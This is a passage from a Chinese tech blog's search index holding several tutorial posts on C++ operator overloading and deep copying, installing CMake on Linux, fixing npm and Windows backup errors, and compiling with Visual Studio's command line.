12345678910111213141516171819202122232425262728293031323334#pragma once#include &lt;iostream&gt;using namespace std;class Array {public: Array(int length); Array(const Array&amp; array); ~Array();public: int length();public: // 使用类成员函数重载 "[]" 数组下标运算符，用于数组元素的赋值和取值 int&amp; operator[](int index); // 使用类成员函数重载 "=" 运算符，用于数组之间的赋值 Array&amp; operator=(const Array&amp; array); // 使用类成员函数重载 "==" 运算符，判断两个数组是否相同 bool operator==(const Array &amp; array); // 使用类成员函数重载 "!=" 运算符，判断两个数组是否不相同 bool operator!=(const Array&amp; array);private: int m_length; int* m_space;}; Array.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include "Array.h"Array::Array(int length) { cout &lt;&lt; "有参构造函数被调用" &lt;&lt; endl; if (length &lt; 0) { length = 0; } this-&gt;m_length = length; this-&gt;m_space = new int[length];}Array::Array(const Array&amp; array) { cout &lt;&lt; "拷贝构造函数被调用" &lt;&lt; endl; // 深拷贝，单独分配内存空间 this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; }}Array::~Array() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}// 使用类成员函数重载 "[]" 数组下标运算符，用于数组元素的赋值和取值int&amp; Array::operator[](int index) { return this-&gt;m_space[index];}// 使用类成员函数重载 "=" 运算符，用于数组之间的赋值Array&amp; Array::operator=(const Array&amp; array) { if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // 深拷贝，单独分配内存空间 this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; } return *this;}// 使用类成员函数重载 "==" 运算符，判断两个数组是否相同bool Array::operator==(const Array&amp; array) { if (this-&gt;m_length != array.m_length) { return false; } for (int i = 0; i &lt; this-&gt;m_length; i++) { if (this-&gt;m_space[i] != array.m_space[i]) { return false; } } return true;}// 使用类成员函数重载 "!=" 运算符，判断两个数组是否不相同bool Array::operator!=(const Array&amp; array) { return !(*this == array);}int Array::length() { return this-&gt;m_length;} main.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include "Array.h"using namespace std;int main() { // 自动调用构造函数 Array array1(5); for (int i = 0; i &lt; array1.length(); i++) { array1[i] = i; } for (int i = 0; i &lt; array1.length(); i++) { cout &lt;&lt; "array1[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array1[i] &lt;&lt; endl; } // 自动调用拷贝构造函数（属于深拷贝） Array array2 = array1; for (int i = 0; i &lt; array2.length(); i++) { cout &lt;&lt; "array2[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array2[i] &lt;&lt; endl; } // 自动调用拷贝构造函数（属于深拷贝） Array array3 = array1; // 不会自动调用拷贝构造函数（属于浅拷贝） // 默认情况下，若这里不对 "=" 运算符进行重载，最终程序会异常终止运行（由于同一块内存空间被释放两次导致） array3 = array2; for (int i = 0; i &lt; array3.length(); i++) { cout &lt;&lt; "array3[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array3[i] &lt;&lt; endl; } // 判断两个数组是否相同 bool result1 = array1 == array2; string strResult1 = result1 ? "=" : "!="; cout &lt;&lt; "array1 " &lt;&lt; strResult1 &lt;&lt; " array2 " &lt;&lt; endl; // 判断两个数组是否不相同 bool result2 = array1 != array2; string strResult2 = result2 ? "!=" : "="; cout &lt;&lt; "array1 " &lt;&lt; strResult2 &lt;&lt; " array2 " &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 1234567891011121314151617181920212223有参构造函数被调用array1[0] = 0array1[1] = 1array1[2] = 2array1[3] = 3array1[4] = 4拷贝构造函数被调用array2[0] = 0array2[1] = 1array2[2] = 2array2[3] = 3array2[4] = 4拷贝构造函数被调用array3[0] = 0array3[1] = 1array3[2] = 2array3[3] = 3array3[4] = 4array1 = array2array1 = array2析构函数被调用析构函数被调用析构函数被调用 重载自定义字符串类的各种运算符在本案例中，自定义了字符串类 MyString，并使用类成员函数和友元函数分别对 MyString 类的 []、=、==、!=、&gt;、&lt;、&gt;&gt;、&lt;&lt; 运算符进行重载。 ★点击显示完整的案例代码★ MyString.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#pragma once#include &lt;iostream&gt;#include "string.h"using namespace std;class MyString {public: MyString(); MyString(int len); MyString(const char* p); MyString(const MyString&amp; str);public: ~MyString();public: // 使用类成员函数重载 "[]" 运算符 char&amp; operator[](int index); // 使用类成员函数重载 "=" 运算符 MyString&amp; operator=(const char* p); MyString&amp; operator=(const MyString&amp; str); // 使用类成员函数重载 "==" 运算符 bool operator==(const char* p) const; bool operator==(const MyString str) const; // 使用类成员函数重载 "!=" 运算符 bool operator!=(const char* p) const; bool operator!=(const MyString str) const; // 使用类成员函数重载 "&gt;" 运算符 bool operator&gt;(const char* p) const; bool operator&gt;(const MyString str) const; // 使用类成员函数重载 "&lt;" 运算符 bool operator&lt;(const char* p) const; bool operator&lt;(const MyString str) const; // 使用友元函数重载 "&lt;&lt;" 运算符 friend ostream&amp; operator&lt;&lt;(ostream&amp; out, MyString&amp; str); // 使用友元函数重载 "&gt;&gt;" 运算符 friend iostream&amp; operator&gt;&gt;(iostream&amp; in, MyString&amp; str);public: int length(); char* c_str();private: int m_length; char* m_space;}; MyString.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#include "MyString.h"// 无参构造函数MyString::MyString() { // 初始化为空字符串 this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, "");}// 有参构造函数MyString::MyString(int len) { if (len &lt; 0) { len = 0; } // 初始化为空字符串 this-&gt;m_length = len; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, "");}// 有参构造函数MyString::MyString(const char* p) { if (p == NULL) { // 初始化为空字符串 this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, ""); } else { this-&gt;m_length = strlen(p); this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, p); }}// 拷贝构造函数MyString::MyString(const MyString&amp; str) { // 深拷贝，重新分配内存空间 this-&gt;m_length = str.m_length; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, str.m_space);}// 析构函数MyString::~MyString() { // 释放内存空间 if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}// 使用类成员函数重载 "[]" 运算符char&amp; MyString::operator[](int index) { return this-&gt;m_space[index];}// 使用类成员函数重载 "=" 运算符MyString&amp; MyString::operator=(const char* p) { // 释放内存空间 if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // 深拷贝，重新分配内存空间 if (p == NULL) { // 初始化为空字符串 this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, ""); } else { this-&gt;m_length = strlen(p); this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, p); } return *this;}// 使用类成员函数重载 "=" 运算符MyString&amp; MyString::operator=(const MyString&amp; str) { // 释放内存空间 if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // 深拷贝，重新分配内存空间 this-&gt;m_length = str.m_length; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, str.m_space); return *this;}// 使用类成员函数重载 "==" 运算符bool MyString::operator==(const char* p) const { if (p == NULL) { if (this-&gt;m_length == 0) { return true; } return false; } if (this-&gt;m_length != strlen(p)) { return false; } return !strcmp(this-&gt;m_space, p);}bool MyString::operator==(const MyString str) const { if (this-&gt;m_length != str.m_length) { return false; } return !strcmp(this-&gt;m_space, str.m_space);}// 使用类成员函数重载 "!=" 运算符bool MyString::operator!=(const char* p) const { return !(*this == p);}bool MyString::operator!=(const MyString str) const { return !(*this == str);}// 使用类成员函数重载 "&gt;" 运算符bool MyString::operator&gt;(const char* p) const { return strcmp(p, this-&gt;m_space) &lt; 0;}bool MyString::operator&gt;(const MyString str) const { return strcmp(str.m_space, this-&gt;m_space) &lt; 0;}// 使用类成员函数重载 "&lt;" 运算符bool MyString::operator&lt;(const char* p) const { return strcmp(this-&gt;m_space, p) &lt; 0;}bool MyString::operator&lt;(const MyString str) const { return strcmp(this-&gt;m_space, str.m_space) &lt; 0;}// 使用友元函数重载 "&lt;&lt;" 运算符ostream&amp; operator&lt;&lt;(ostream&amp; out, MyString&amp; str) { out &lt;&lt; str.m_space; return out;}// 使用友元函数重载 "&gt;&gt;" 运算符iostream&amp; operator&gt;&gt;(iostream&amp; in, MyString&amp; str){ in &gt;&gt; str.m_space; return in;}int MyString::length(){ return this-&gt;m_length;}char* MyString::c_str() { return this-&gt;m_space;} main.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include "MyString.h"int main() { // 自动调用有参构造函数 MyString str1("Tom"); MyString str2(NULL); MyString str3("Peter"); // 自动调用拷贝构造函数 MyString str4 = str1; // 重载 "&lt;&lt;" 运算符 cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; cout &lt;&lt; endl; // 不会自动调用拷贝构造函数（属于浅拷贝） // 重载 "=" 运算符，实现深拷贝 str4 = str3; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; str4 = "Jim"; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; str4 = NULL; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; cout &lt;&lt; endl; // 重载 "[]" 运算符 MyString str5("David"); str5[0] = \'F\'; cout &lt;&lt; "str5[0] = " &lt;&lt; str5[0] &lt;&lt; endl; cout &lt;&lt; "str5 = " &lt;&lt; str5 &lt;&lt; endl; cout &lt;&lt; endl; // 重载 "==" 运算符 MyString str6("Aaron"); MyString str7 = str6; cout &lt;&lt; str6 &lt;&lt; (str6 == str7 ? " = " : " != ") &lt;&lt; str7 &lt;&lt; endl; // 重载 "!=" 运算符 cout &lt;&lt; str6 &lt;&lt; (str6 != NULL ? " != " : " = ") &lt;&lt; " NULL" &lt;&lt; endl; cout &lt;&lt; endl; // 重载 "&lt;" 运算符 MyString str8("AAAA"); MyString str9("BBBB"); cout &lt;&lt; str8 &lt;&lt; (str8 &lt; str9 ? " &lt; " : " &gt; ") &lt;&lt; str9 &lt;&lt; endl; cout &lt;&lt; str8 &lt;&lt; (str8 &lt; "CCCC" ? " &lt; " : " &gt; ") &lt;&lt; "CCCC" &lt;&lt; endl; // 重载 "&gt;" 运算符 cout &lt;&lt; str9 &lt;&lt; (str9 &gt; str8 ? " &gt; " : " &lt; ") &lt;&lt; str8 &lt;&lt; endl; cout &lt;&lt; str9 &lt;&lt; (str9 &gt; "DDDD" ? " &gt; " : " &lt; ") &lt;&lt; "DDDD" &lt;&lt; endl; cout &lt;&lt; endl; // 重载 "&gt;&gt;" 运算符 MyString str11(5); cout &lt;&lt; "请输入长度为 5 的字符串：" &lt;&lt; endl; cin &gt;&gt; str11.c_str(); cout &lt;&lt; "str11 = " &lt;&lt; str11 &lt;&lt; endl; // MyString str4 = NULL; 此写法，会自动调用有参构造函数 `MyString(const char* p);` // MyString str1("AB"); // MyString str2 = str1; // str2 = NULL: 此写法，会自动调用 "=" 运算符重载的函数 `bool operator==(const char* p) const;` return 0;} 程序运行的输出结果如下： 123456789101112131415161718192021str2 =str4 = Tomstr4 = Peterstr4 = Jimstr4 =str5[0] = Fstr5 = FavidAaron = AaronAaron != NULLAAAA &lt; BBBBAAAA &lt; CCCCBBBB &gt; AAAABBBB &lt; DDDD请输入长度为 5 的字符串：abcdestr11 = abcde C++ 运算符和结合性的附录 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"CMake 入门教程之一 Linux 安装 CMake",url:"/posts/65d4f633.html",text:'Linux 安装 CMake3通过软件仓库安装 OpenSSL提示 在 Linux 系统上，安装 CMake3 的时候，一般需要提前安装 OpenSSL，尤其是使用源码编译的方式安装 CMake3 在 Linux 系统上，OpenSSL 通过源码编译安装的教程可以看这里 CentOS/Fedora 1# yum install -y openssl openssl-devel Debian/Ubuntu 1# apt-get -y install zlib1g zlib1g-dev libssl-dev 通过软件仓库安装 CMake3 CentOS/Fedora 12345# 添加EPEL源# yum install epel-release# 安装Cmake3# yum install -y cmake3 本地手动编译安装 CMake3提示 各版本的 CMake3 可以从 GitHub 仓库下载得到 CMake3 使用源码编译安装的方式，适用于绝大多数 Linux 发行版，例如：Debian/Ubuntu。 1234567891011121314151617181920212223242526# 下载文件# wget https://github.com/Kitware/CMake/releases/download/v3.21.0-rc1/cmake-3.21.0-rc1.tar.gz# 解压文件# tar -zxvf cmake-3.21.0-rc1.tar.gz# 进入解压目录# cd cmake-3.21.0-rc1# 构建# ./bootstrap# 编译# make -j4# 安装# make install# 创建软链接# ln -sf /usr/local/bin/cmake /usr/local/bin/cmake3# 查看版本号# cmake3 --version# 或者# cmake --version CMake 命令行编译代码1234567891011121314151617# 进入项目根目录# cd my_project# 创建构建目录# mkdir build# 进入构建目录# cd build# 生成makefile# cmake3 ..# 编译生成可执行文件# make# 运行可执行程序# ./my_project var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ c语言 linux系统编程"},{title:"解决 Windows 系统使用 NPM 时遇到的各种问题",url:"/posts/b53b9a77.html",text:'pngquant-bin 模块安装失败 错误信息： 1234567891011npm ERR! path E:\\Workspaces_NodeJs\\hexo\\node_modules\\pngquant-binnpm ERR! command failednpm ERR! command C:\\WINDOWS\\system32\\cmd.exe /d /s /c node lib/install.jsnpm ERR! ‼ getaddrinfo ENOENT raw.githubusercontent.comnpm ERR! ‼ pngquant pre-build test failednpm ERR! i compiling from sourcenpm ERR! × ErroE: pngquant failed to build, make sure that libpng-dev is installednpm ERR! at E:\\Workspaces_NodeJs\\hexo\\node_modules\\bin-build\\node_modules\\execa\\index.js:231:11npm ERR! at runMicrotasks (&lt;anonymous&gt;)npm ERR! at processTicksAndRejections (node:internal/process/task_queues:96:5)npm ERR! at async Promise.all (index 0) 解决方法一：使用 系统管理员身份，在 Windows 系统上执行 npm install -g windows-build-tools 命令，安装系统缺失的编译工具，然后执行 npm install 命令安装需要的 NPM 模块 解决方法二（推荐）：使用 CNPM 替代 NPM，然后执行 cnpm install 命令安装需要的 NPM 模块 12# 安装CNPMnpm install -g cnpm --registry=https://registry.npmmirror.com 解决方法三（推荐）：在 Windows 系统上挂载 VPN，然后执行 npm install 命令安装需要的 NPM 模块，这可以从根本上解决国内访问 raw.githubusercontent.com 域名时被墙的问题 解决方法四：更改 Host 文件 C:\\Windows\\System32\\drivers\\etc\\hosts，在文件末尾添加以下内容，解决国内访问 raw.githubusercontent.com 域名时被墙的问题，然后执行 npm install 命令安装需要的 NPM 模块 1199.232.28.133 raw.githubusercontent.com var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"windows系统"},{title:"Windows 10 系统备份与还原常见错误解决",url:"/posts/490dddd2.html",text:'前言Windows 10 中的备份和还原（Windows 7）作为 Microsoft Windows 组件，继承了 Windows 7 的功能，该功能使您可以备份与恢复文件以及创建系统映像。如果在 Windows 的早期版本中使用 备份 和 还原 来备份文件或创建系统映像，则仍可以在 Windows 10 中恢复这些备份。此外，Windows 10 还包括另一个备份与恢复工具 - 文件历史记录，它只备份文档，音乐，图片，视频和桌面文件夹中文件的版本，以及 PC 上可用的 OneDrive 文件。如果要使用 文件历史记录 备份位于其他位置的其他文件，可以将其移至这些文件夹之一，然后再进行备份。保存备份的两个目标地址支持外部硬盘驱动器（例如 USB 闪存驱动器）和网络位置。 系统备份常见错误错误一错误提示信息无法创建卷影副本，请检查 vss 和 spp 应用程序事件日志更多信息（错误代码：0x81000019） 或者 由于内部错误，备份应用程序无法启动：卷影复制服务组件遇到意外错误（错误代码：0x80042302） 错误解决方案一这个错误可能是由于三方杀毒软件冲突或者一些 Windows 备份相关的服务被禁用导致的，具体解决步骤如下： a) 暂时关闭或卸载第三方杀毒软件 b) 使用快捷键 windows + r，输入 services.msc，打开服务控制台，并检查下列服务是否正常运行。如果服务被禁用，请将其启用，并将启动类型设置为 自动。 12345Volume Shadow Copy (VSS)Remote Procedure Call (RPCSS)COM+ Event System (eventsystem)System Event Notification Service (sens)Microsoft Software Shadow Copy Provider (SWPRV) c) 重启 Windows 10 系统，然后再次尝试执行系统备份 错误解决方案二 a) 使用快捷键 windows + r，输入 msconfig b) 点击 服务 标签卡，勾选 隐藏所有的 Microsoft 服务 ，然后点击全部禁用并应用 c) 点击 启动 标签卡，点击 打开任务管理器 d) 禁用全部开机启动项 e) 重启 Windows 10 系统，然后再次尝试执行系统备份 f) 系统成功备份后，重新启用在上面的步骤中禁用的服务和开机启动项，最后再次重启系统 错误二错误提示信息Windows 备份在源卷上创建共享保护点失败（错误代码：0×8078006B） 错误解决方案这个错误一般是由程序冲突引起的，目前排查出是 腾讯电脑管家 的设置问题导致，具体解决步骤如下： a) 打开 腾讯电脑管家 的 设置中心 b) 找到 实时防护 菜单下面的 其他安全提示，将 开启卷影备份 的勾选去掉 c) 如果上述设置仍然没办法解决问题，建议暂时关闭或卸载 腾讯电脑管家 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"windows系统"},{title:"Visual Studio 使用命令行编译 C/C++ 程序",url:"/posts/ab3ae9a.html",text:'VS 使用命令行编译单个 C/C++ 源文件在 Windows 系统的开始菜单栏里，找到 Developer Command Prompt for VS xxxx 应用程序，双击运行后，在 Command 窗口内执行以下命令来编单个 C/C++ 源文件。值得一提的是，这里需要将以下命令中的 HelloWorld 字符串替换为本地真正的 C/C++ 源文件的文件名。 12345678910111213141516171819# 查看文件列表&gt; dir2021/10/30 16:05 &lt;DIR&gt; .2021/10/30 16:05 &lt;DIR&gt; ..2021/10/30 22:15 601 HelloWorld.cpp# 编译C/C++源文件（cl后面字符的是小写L不是数字1）&gt; cl HelloWorld.cpp /EHsc# 查看文件列表，发现成功编译后会多了两个文件&gt; dir2021/10/30 16:53 &lt;DIR&gt; .2021/10/30 16:53 &lt;DIR&gt; ..2021/10/30 22:15 601 HelloWorld.cpp2021/10/30 16:53 101,888 HelloWorld.exe2021/10/30 16:53 1,976 HelloWorld.obj# 运行编译后的C/C++程序&gt; HelloWorld 或者 HelloWorld.exe VS 使用命令行编译多个 C/C++ 源文件假设项目里有如下的三个 C/C++ 源文件，分别是 Array.h、Array.cpp、main.cpp，那么编译这几个文件时就可以使用命令：cl main.cpp Array.cpp /EHsc。值得一提的是，编译命令里不需要指定以 .h 作为后缀的文件，只需要指定所有以 .c 或者 .cpp 作为后缀的文件即可。 Array.h 1234567891011121314151617181920212223#pragma once#include &lt;iostream&gt;using namespace std;class Array {public: Array(int length); Array(const Array&amp; array); ~Array();public: void setData(int index, int value); int getData(int index); int length();private: int m_length; int* m_space;}; Array.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041#include "Array.h"Array::Array(int length) { cout &lt;&lt; "有参构造函数被调用" &lt;&lt; endl; if (length &lt; 0) { length = 0; } this-&gt;m_length = length; this-&gt;m_space = new int[length];}Array::Array(const Array&amp; array) { cout &lt;&lt; "拷贝构造函数被调用" &lt;&lt; endl; // 深拷贝，单独分配内存空间 this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; }}Array::~Array() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}void Array::setData(int index, int value) { this-&gt;m_space[index] = value;}int Array::getData(int index) { return this-&gt;m_space[index];}int Array::length() { return this-&gt;m_length;} main.cpp 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include "Array.h"using namespace std;int main() { // 自动调用构造函数初始化数组 Array array1(5); // 数组赋值 for (int i = 0; i &lt; array1.length(); i++) { array1.setData(i, i); } // 打印数组 for (int i = 0; i &lt; array1.length(); i++) { cout &lt;&lt; "array1[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array1.getData(i) &lt;&lt; endl; } // 自动调用拷贝构造函数初始化数组（属于深拷贝） Array array2 = array1; // 打印数组 for (int i = 0; i &lt; array2.length(); i++) { cout &lt;&lt; "array2[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array2.getData(i) &lt;&lt; endl; } return 0;} 执行命令编译 C/C++ 程序后，控制台输出的日志信息如下： 1234567891011121314&gt; cl main.cpp Array.cpp /EHsc用于 x86 的 Microsoft (R) C/C++ 优化编译器 19.29.30136 版版权所有(C) Microsoft Corporation。保留所有权利。main.cppArray.cpp正在生成代码...Microsoft (R) Incremental Linker Version 14.29.30136.0Copyright (C) Microsoft Corporation. All rights reserved./out:main.exemain.objArray.obj 运行编译后的 C/C++ 程序： 12345678910111213141516&gt; main有参构造函数被调用array1[0] = 0array1[1] = 1array1[2] = 2array1[3] = 3array1[4] = 4拷贝构造函数被调用array2[0] = 0array2[1] = 1array2[2] = 2array2[3] = 3array2[4] = 4析构函数被调用析构函数被调用 参考博客 模仿 Visual Studio - 命令行编译 C/C++ 程序 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ 开发工具"},{title:"C++ 入门基础之五",url:"/posts/a35089f6.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 浅拷贝与深拷贝 C++ 提供的默认拷贝构造函数，可以完成对象的数据成员值简单的复制（浅拷贝） 对象的数据资源是由指针指向的堆，C++ 提供的默认拷贝构造函数仅作指针值复制（浅拷贝） 浅拷贝问题剖析 问题抛出思考以下的代码为什么会异常终止运行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char *p; int len;public: Name(const char *name) { cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; int length = strlen(name); p = (char *) malloc(length + 1); strcpy(p, name); len = length; } ~Name() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; if (p != NULL) { free(p); p = NULL; len = 0; } } char *getP() const { return p; } int getLen() const { return len; }};int main() { Name obj1("Peter"); Name obj2 = obj1; // 自动调用C++提供的默认拷贝构造函数，属于浅拷贝 cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj2.name: " &lt;&lt; obj2.getP() &lt;&lt; ", obj2.len: " &lt;&lt; obj2.getLen() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234567有参构造函数被调用了obj1.name: Peter, obj1.len: 5obj2.name: Peter, obj2.len: 5析构函数被调用了析构函数被调用了Process finished with exit code 134 (interrupted by signal 6: SIGABRT) 问题分析由于在上述的代码中，没有自定义拷贝构造函数，使用的是 C++ 编译器提供的默认拷贝构造函数，因此程序异常终止运行。造成程序异常终止运行的根本原因是，C++ 提供的默认拷贝构造函数属于浅拷贝，当程序运行结束之前，在第二次调用上面的析构函数时会出现错误（同一块内存空间被释放了两次），底层的分析图解可以看这里。 问题解决显式编写自定义的拷贝构造函数，通过实现深拷贝（申请新的内存空间）来解决上述的问题，底层的分析图解可以看这里。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char *p; int len;public: Name(const char *name) { cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; int length = strlen(name); p = (char *) malloc(length + 1); strcpy(p, name); len = length; } // 深拷贝的实现 Name(const Name &amp;name) { cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; int length = name.getLen(); p = (char *) malloc(length + 1); strcpy(p, name.getP()); len = length; } ~Name() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; if (p != NULL) { free(p); p = NULL; len = 0; } } char *getP() const { return p; } int getLen() const { return len; }};int main() { Name obj1("Peter"); Name obj3 = obj1; // 自动调用自定义的拷贝构造函数（深拷贝） cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123456有参构造函数被调用了拷贝构造函数被调用了obj1.name: Peter, obj1.len: 5obj3.name: Peter, obj3.len: 5析构函数被调用了析构函数被调用了 特别注意： 在以下的代码中，obj3 = obj1; 依旧属于浅拷贝（这里不会自动调用拷贝构造函数），最终程序也会异常终止运行。若希望解决该问题，需要重载 C++ 的 = 操作符，这里暂时不展开讨论。 12345678int main() { Name obj1("Peter"); Name obj3("Tom"); obj3 = obj1; // 浅拷贝，不会自动调用拷贝构造函数 cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12345678有参构造函数被调用了有参构造函数被调用了obj1.name: Peter, obj1.len: 5obj3.name: Peter, obj3.len: 5析构函数被调用了析构函数被调用了Process finished with exit code 134 (interrupted by signal 6: SIGABRT) 对象的动态建立和释放使用类名定义的对象都是静态的（如 Teacher t(30);），在程序运行过程中，对象所占的内存空间是不能随时释放的，只有在程序运行结束之后才会被释放。但有时候用户希望在需要用到对象时才建立对象，在不需要用该对象时就撤销它，释放它所占的内存空间以供别的数据使用，这样可提高内存空间的利用率。在 C++ 中，可以用 new 运算符动态建立对象，用 delete 运算符动态撤销对象。 new 和 delete 